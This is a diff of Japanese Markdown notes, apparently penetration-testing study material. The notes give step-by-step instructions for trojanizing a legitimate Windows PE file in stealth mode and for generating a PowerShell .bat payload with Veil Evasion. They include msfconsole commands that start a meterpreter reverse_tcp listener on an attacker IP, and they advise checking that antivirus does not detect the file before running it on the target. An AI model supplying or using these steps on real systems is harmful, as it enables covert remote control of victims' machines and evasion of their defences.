@@ -321,23 +321,22 @@ $$ターゲットPEの選択・自動バックアップ$$
 
 3. ステルスモードを有効（Y）にする（ペイロード実行後も通常のPEとして振る舞う）
 
-![](https://claude.ai/%E7%94%BB%E5%83%8F%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB/Pasted%20image%2020250704124053.png)
+![](../../画像ファイル/Pasted%20image%2020250704124053.png)
 
 4. ペイロードを選択（L：リストから / C：自作）→ LHOST・LPORTを入力
 
-![](https://claude.ai/%E7%94%BB%E5%83%8F%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB/Pasted%20image%2020250704124409.png)
+![](../../画像ファイル/Pasted%20image%2020250704124409.png)
 
 5. Verification（有効かどうかを検証）→ Enterでターゲット PEファイルが悪意あるPEに変換される
 
-![](https://claude.ai/%E7%94%BB%E5%83%8F%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB/Pasted%20image%2020250704124644.png)
+![](../../画像ファイル/Pasted%20image%2020250704124644.png)
 
-6. meterpreterリスナーを立てる
-
+6. ターゲットに送付する前にmeterpreterリスナーを立てる
 ```zsh
 msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST <attacker_IP>;set LPORT <port>;run;"
 ```
 
-7. ターゲットのWindowsマシンに転送・AVでスキャンして検知されないことを確認してから実行
+7. ターゲットのWindowsマシンに転送後、AVでスキャンして検知されないことを確認してから実行
 
 ---
 
@@ -355,20 +354,17 @@ sudo veil
 ```
 
 1. Evasionモードを選択
-
 ```zsh
 use 1
 ```
 
 2. PowerShellのbatファイル生成ペイロードを選択
-
 ```zsh
 list
 use 22   # powershell/meterpreter/rev_tcp
 ```
 
 3. オプション設定とペイロード生成
-
 ```zsh
 options
 set LHOST <attacker_IP>
@@ -376,12 +372,10 @@ generate
 ```
 
 出力ファイル：
-
 - `/var/lib/veil/output/source/payload.bat`
 - `/var/lib/veil/output/handlers/payload.rc`
 
-4. meterpreterリスナーを立てる
-
+4. ターゲットに送る前にmeterpreterリスナーを立てる
 ```zsh
 msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST <attacker_IP>;set LPORT <port>;run;"
 ```
